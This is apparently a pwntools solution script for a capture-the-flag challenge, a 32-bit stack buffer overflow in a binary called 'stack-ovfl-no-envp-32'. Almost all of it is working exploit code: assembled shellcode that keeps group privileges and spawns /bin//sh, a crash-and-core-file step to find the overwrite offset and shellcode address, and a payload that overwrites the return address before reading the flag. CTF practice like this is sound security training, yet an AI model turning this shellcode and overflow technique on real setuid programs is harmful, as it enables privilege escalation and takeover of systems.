from pwn import *
import os

DEBUG = False 

shellcode = asm('''
xor    eax,eax
xor    al,0x32
int    0x80
mov    ebx,eax
mov    ecx,eax
xor    eax,eax
xor    al,0x47
int    0x80
xor    ecx,ecx
xor    edx,edx
xor    eax,eax
xor    al,0xb
xor    ebx,ebx
push   ebx
push   0x68732f6e
push   0x69622f2f
mov    ebx,esp
int    0x80
''') 

env = {}
file = ['./stack-ovfl-no-envp-32', shellcode]

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
shellcode_address = core.stack.find(shellcode)
buffer_address = core.stack.find(cyclic(50))
max_len = cyclic(10000).find(p32(core.fault_addr))
os.unlink(core.path) 

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b main
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE


payload = b"A" * (max_len) + p32(shellcode_address)
io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Hello', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
